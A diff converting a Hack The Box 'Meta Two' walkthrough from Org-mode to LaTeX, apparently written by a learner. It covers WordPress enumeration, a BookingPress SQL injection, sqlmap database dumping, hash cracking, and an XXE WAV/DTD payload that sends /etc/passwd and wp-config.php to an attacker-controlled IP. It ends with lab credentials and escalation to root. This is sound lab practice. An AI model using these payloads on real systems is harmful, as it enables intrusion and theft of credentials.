@@ -1,35 +1,62 @@
-#+title: Meta Two
-#+latex_compiler: latexmk
-#+options: ^:{}
+% Created 2023-04-02 Sun 03:58
+\documentclass[11pt]{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{graphicx}
+\usepackage{longtable}
+\usepackage{wrapfig}
+\usepackage{rotating}
+\usepackage[normalem]{ulem}
+\usepackage{amsmath}
+\usepackage{amssymb}
+\usepackage{capt-of}
+\usepackage{hyperref}
+\author{Federico Pontoriero}
+\date{\today}
+\title{Meta Two}
+\hypersetup{
+ pdfauthor={Federico Pontoriero},
+ pdftitle={Meta Two},
+ pdfkeywords={},
+ pdfsubject={},
+ pdfcreator={Emacs 28.1.91 (Org mode 9.6.1)}, 
+ pdflang={English}}
+\begin{document}
 
-* Connection and nmap
+\maketitle
+\tableofcontents
+
+
+\section{Connection and nmap}
+\label{sec:orga5dee41}
 First we connect to the openvpn that HTB provides us and spin the machine
 Then we will use nmap, as usual for enumeration:
 
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 sudo nmap -sC -sV -T4 10.10.11.186
-#+end_src
+\end{verbatim}
 
 The options are following:
 -sC: to use the default scripts
 -sV: probes the open ports for system information
 -T4: to define the aggressiveness of the scan
 
-* First steps
+\section{First steps}
+\label{sec:org9c3964f}
 
 We can gather that there are 3 open ports: 21 (ftp), 22 (ssh) and 80 (http).
 
 The version of OpenSSH that is being used does not seem to be vulnerable but
 we can try other things such as connecting through ftp:
 
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 ftp 10.10.11.186
-#+end_src
+\end{verbatim}
 
 and trying to log as anonymous. This does not work.
 
 So we are left with the http service which we know that is nginx/1.18.0 and the
-hostname is http://metapress.htb/.
+hostname is \url{http://metapress.htb/}.
 
 We then have to go to /etc/hosts and append the ip and hostname using any text
 editor.
@@ -43,19 +70,20 @@ apps.
 
 One way or another we should be able to browse the page now.
 
-* Looking for vulnerabilities
+\section{Looking for vulnerabilities}
+\label{sec:org2b1a89b}
 
 We can look at the source code and it does not seem to be leaking any credentials
 but we can see it's a Wordpress site. We can play around with the forms and
 explore a little. Now we will use wpscan which is a command line tool for Wordpress
 security.
 
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 wpscan --url http://metapress.htb
-#+end_src
+\end{verbatim}
 
 
-You can look them up in https://wpscan.com/wordpress/562 and go through each of
+You can look them up in \url{https://wpscan.com/wordpress/562} and go through each of
 them but if we go back to the source code of the events page we can see that is
 using a plugin called Bookingpress and filter our search. In the same page we
 can see that there is a SQL injection vulnerability and a proof of concept.  In
@@ -68,18 +96,18 @@ the fact that is telling us that the version of Wordpress (5.6.2) is identified
 as insecure. So we will look for the vulnerabilities associated with this version.
 
 So the command we have to use would look like something like this:
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 curl -i 'http://metapress.htb.com/wp-admin/admin-ajax.php'--data
 'action=bookingpress_front_get_category_services
     &_wpnonce=1b624223cc&category_id=29&total_service=-7507)
 UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,-5,-5,-5,-5,-5,-5--
 -'
-#+end_src
+\end{verbatim}
 
 
 You should replace the nonce with the one that you can find in the source code, and the output will be like this:
 
-#+begin_quote
+\begin{quote}
 HTTP/1.1 200 OK
 Server: nginx/1.18.0
 Date: Thu, 23 Mar 2023 07:08:14 GMT
@@ -94,102 +122,105 @@ Cache-Control: no-cache, must-revalidate, max-age=0
 X-Frame-Options: SAMEORIGIN
 Referrer-Policy: strict-origin-when-cross-origin
 
-[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1",
-"bookingpress_category_id":"Debian
-11","bookingpress_service_name":"debian-linux-gnu",
-"bookingpress_service_price":"$1.00,
-"bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3",
-"bookingpress_service_description":"4","bookingpress_service_position":"5",
-"bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":
-"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"}]
-#+end_quote
+[\{``bookingpress\_service\_id'':``10.5.15-MariaDB-0+deb11u1'',
+``bookingpress\_category\_id'':``Debian
+11'',``bookingpress\_service\_name'':``debian-linux-gnu'',
+``bookingpress\_service\_price'':``\$1.00,
+''bookingpress\_service\_duration\_val``:''2``,''bookingpress\_service\_duration\_unit``:''3``,
+''bookingpress\_service\_description``:''4``,''bookingpress\_service\_position``:''5``,
+''bookingpress\_servicedate\_created``:''6``,''service\_price\_without\_currency``:1,''img\_url``:
+''\url{http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg}``\}]
+\end{quote}
 
-* Enumerating databases: Sqlmap
+\section{Enumerating databases: Sqlmap}
+\label{sec:orgc9272e3}
 
 Now we can use sqlmap, which is a tool for automating the process of detecting
 and exploiting SQL injection vulnerabilities. We can use it to identify the
 database management system, enumerate databases, tables and columns, extract the
 data and even run commands.
 
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php"
 --data="action=bookingpress_front_get_category_services&_wpnonce=1b624223cc
     &category_id=33&total_service=1" -p "total_service" --dbs
-#+end_src
+\end{verbatim}
 That way we can enumerate the databases present. I had problems with this command
 since it kept saying that the connection was not stable but i just kept trying
 and eventually I could do it.
 
-The databases that we could found are two: blog and information_schema.
+The databases that we could found are two: blog and information\_schema.
 The first one is the most interesting of the two, clearly.
 
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php"
 --data="action=bookingpress_front_get_category_services&_wpnonce=1b624223cc
     &category_id=33&total_service=1" -D blog --tables
-#+end_src
+\end{verbatim}
 Now we look inside the blog database and enumerate the tables: there is a lot of them
-but the first that catches the eye is wp_users. After some horrible looking output
+but the first that catches the eye is wp\_users. After some horrible looking output
 we can see that it found two users, admin and manager.
 Along side the names we can see the hashes that correspond to the passwords, so we
 will copy them to a file and try to crack them.
 
-* Cracking the passwords: John the Ripper
+\section{Cracking the passwords: John the Ripper}
+\label{sec:org1448994}
 
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 john password.txt --wordlist=/usr/share/wordlists/rockyou.txt
-#+end_src
+\end{verbatim}
 We are using John the Reaper which is a hashcracking program, in this case we are
 using the classic rockyou wordlist that. I had to decompress the rockyou file before
 utilizing the command, just so you know.
 
-We see that it found one password, the manager's which is "partylikearockstar".
+We see that it found one password, the manager's which is ``partylikearockstar''.
 
 So we have a username and a password but we have to find out where to enter them.
 Although there is no login link in the page, based in our enumeration we know that
-there is a subdomain called "wp-admin". So if we go to http://metapress.htb/wp-admin
+there is a subdomain called ``wp-admin''. So if we go to \url{http://metapress.htb/wp-admin}
 we will encounter the Wordpress page for authentication, we enter the credentials
 and we are in!
 
-* Exploiting XXE
+\section{Exploiting XXE}
+\label{sec:orgc31c680}
 
 Looking around the vulnerabilities of this version of Wordpress I encounter this
-article: https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/
+article: \url{https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/}
 It's a fascinating thing. It essentially uses the metadata of a WAVE file to
 inject payload and retrieve information.
 
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml
       version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM
        '"'"'http://10.10.14.83:1234/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' >
 payload.wav
-#+end_src
+\end{verbatim}
 That is the code that the author suggests, the only thing we should change it's the
 ip, replacing it with our own and I also changed the port to 1234 for convenience.
 
 Now if we continue with the article we have to send this payload through a dtd file
 which will look like this:
 
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 <!ENTITY % file SYSTEM
 "php://filter/read=convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % init "<!ENTITY &#x25;
           trick SYSTEM 'http://10.10.14.83:1234/?p=%file;'>">
-#+end_src
+\end{verbatim}
 
 Again we have to modify the ip and port.
 
 We will start a php server:
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 php -S 0.0.0.0:1234
-#+end_src
+\end{verbatim}
 
 And we go the the media page. Then click on add new and upload our payload.wav while
 the server is still running. We will get a huge, horrible looking output but we can
 decode it using:
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 echo -en <payload> | base64 -d
-#+end_src
+\end{verbatim}
 
 Now the output looks much more interesting since these is the passwd file of the
 machine we are trying to pawn. Of course if we analyze it there really is nothing
@@ -198,17 +229,17 @@ exploited.
 
 If we modify the evil.dtd file that we created before to give us the config file of
 the page we might be more lucky.
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/
          resource=/var/www/metapress.htb/blog/wp-config.php">
 <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM
          'http://10.10.14.83:1234/?p=%file;'>">
-#+end_src
+\end{verbatim}
 
 So we upload the payload.wav file again and again we decode the output which will
 look like this:
 
-#+begin_src php :results output :wrap "quote" :exports code
+\begin{verbatim}
 <?php
 /** The name of the database for WordPress */
 define( 'DB_NAME', 'blog' );
@@ -275,39 +306,41 @@ if ( ! defined( 'ABSPATH' ) ) {
 /** Sets up WordPress vars and included files. */
 require_once ABSPATH . 'wp-settings.php';
 
-#+end_src
+\end{verbatim}
 
 There is a lot of hashes in there but the interesting thing is that we have a method:
 FTP, the user and the password (hashed). We already tried to connect to ftp and we
 couldn't so maybe this could prove useful.
 
-* Getting the credentials
+\section{Getting the credentials}
+\label{sec:org8ab4290}
 
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 ftp 10.10.11.186
-#+end_src
+\end{verbatim}
 And we enter our newly found credentials.
 
 If we list the files using ls, we will see two folders: blog and mailer.
-We cd to mailer and then download the send_email.php file with the get command.
+We cd to mailer and then download the send\_email.php file with the get command.
 It will download to our current directory and if we cat it we can see that there are
 more credentials!
 
 In particular these two could be used for ssh access:
-#+begin_quote
-$mail->Username = "jnelson@metapress.htb";
-$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
-#+end_quote
+\begin{quote}
+\$mail->Username = ``jnelson@metapress.htb'';
+\$mail->Password = ``Cb4\_JmWM8zUZWMu@Ys'';
+\end{quote}
 
 So we will do that:
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 ssh jnelson@metapress.htb
-#+end_src
+\end{verbatim}
 We input the password and we can see that it works!
 Now we can do an ls and find out that there is the user.txt file with the flag that
 we want.
 
-* Escalating the privileges
+\section{Escalating the privileges}
+\label{sec:org7239e44}
 
 If we try to use sudo we will see that we cannot. However we can see that there is a
 .passpie directory. Passpie is a password manager for Linux and there is a .keys
@@ -317,33 +350,33 @@ worth a try.
 So we will copy the private key block of the .keys file to our machine and write it
 to a file called key. And use gpg2john to write it to another file unhashed:
 
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 gpg2john key > pass_hash
-#+end_src
+\end{verbatim}
 
 And run it through john again:
-#+begin_src sh :results output :wrap "quote" :exports code
+\begin{verbatim}
 john --wordlist=/usr/share/wordlists/rockyou.txt pass_hash
-#+end_src
+\end{verbatim}
 And once it is done:
-#+begin_src sh :results output :wrap "quote" :exports code
+\begin{verbatim}
 john --wordlist=/usr/share/wordlists/rockyou.txt pass_hash
-#+end_src
+\end{verbatim}
 
-Now we can see that the password is "blink182". We don't know what this is for but
+Now we can see that the password is ``blink182''. We don't know what this is for but
 we can find out using:
 
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 passpie export pass
-#+end_src
+\end{verbatim}
 
-And entering "blink182" as the Passphrase. Now we can see that the root user has
-'p7qfAZt4_A1xo_0x' as password.
+And entering ``blink182'' as the Passphrase. Now we can see that the root user has
+'p7qfAZt4\_A1xo\_0x' as password.
 
 So we will:
-#+begin_src shell :results output :wrap "quote" :exports code
+\begin{verbatim}
 su root
-#+end_src
+\end{verbatim}
 
 And enter that as the password and we are in! We are root!
 
@@ -352,6 +385,5 @@ So let's end this, let's go to /root/root.txt and extract our flag from there.
 And that is it! I hope this was informative, I am still a noob but I had a great
 time trying to crack this.
 
-#+attr_html: :width 1200px
-#+attr_latex: :center nil :height 10cm :width 12cm
-[[/mnt/c/Users/Federico/Pictures/Screenshots/test.png]]
+\includegraphics[width=12cm,height=10cm]{/mnt/c/Users/Federico/Pictures/Screenshots/test.png}
+\end{document}
